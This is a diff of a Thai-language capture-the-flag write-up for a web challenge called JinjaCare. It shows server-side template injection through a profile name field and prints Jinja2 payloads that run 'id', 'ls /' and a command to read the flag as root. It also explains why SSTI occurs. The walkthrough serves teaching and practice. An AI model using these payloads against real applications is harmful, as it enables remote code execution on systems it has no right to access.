@@ -1,9 +1,13 @@
 Hi, Can you speak Thai ?
+
 Yes, I can speak Thai.
+
 มา วันนี้เราจะมาทำข้อ JinjaCare หมวด Web ระดับ Very easy
+
 
 Step 1 สร้างบัญชี
 เขาจะให้ IP มา คือ 94.237.121.100:50594 จากนั้นเราก็เข้าไปที่ Sign In แล้วเลือก create a new account ในส่วนของข้อมูลที่ใช้สมัคร เราสามารถสมมติขึ้นมาเองได้เลย
+
 
 Step 2 49
 
@@ -14,6 +18,7 @@ Step 2 49
 2.3 กลับไปที่ Dashboard กด Download Certificate
 
 2.4 สังเกตตรง Name มันจะเป็น 49 ถ้าไม่ใช่ 49 ให้กลับไปดูตรง Full Name ในหน้า Personal Info ใหม่
+
 
 Step 3 id
 ```
@@ -33,6 +38,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20
 
 3.3 สังเกตตรง Name มันจะเปลี่ยนเป็น uid=0(root) gid=0(root) groups=0(root)
 
+
 Step 4 ls
 
 4.1 ไปที่ Personal Info และไปที่ Full Name เปลี่ยนข้อมูลจาก
@@ -45,7 +51,9 @@ Step 4 ls
 ```
 4.2 สังเกตตรง Name มันจะเปลี่ยนเป็น app bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
 
+
 Step 5 cat flag.txt
+
 5.1 ไปที่ Personal Info และไปที่ Full Name เปลี่ยนข้อมูลจาก
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
@@ -71,6 +79,7 @@ XXXXX ไม่ใช้ flag นะ คือปิดไว้ จะได้
 - ถ้าแอปเอา "{{7*7}}" เข้าไปและ engine ประมวลเป็น 49 แปลว่าระบบตีความข้อมูลเป็นโค้ด นี่ไม่ใช่การปฏิบัติต่อข้อมูลแบบนิ่งและเสี่ยงเกิด SSTI
 
 ศัพท์น่าสงสัย
+
 "ข้อมูล" แบบนิ่ง (literal) คือ ค่าข้อมูลที่ถูกกำหนดไว้อย่างชัดเจนและคงที่ในโค้ดหรือเทมเพลตนั้น ๆ โดยตรง ไม่ใช่ค่าที่ได้จากการคำนวณ ตัวแปร หรือการดึงข้อมูลจากแหล่งภายนอก
 ลักษณะของข้อมูลแบบนิ่ง (Literal Data) ข้อมูลแบบนิ่งจะถูกตีความตามที่เห็น โดยไม่ต้องมีการประมวลผลหรือค้นหาเพิ่มเติม มักเป็นประเภทข้อมูลพื้นฐาน เช่น Literal String, Literal Number เป็นต้น
 ตัวอย่าง:
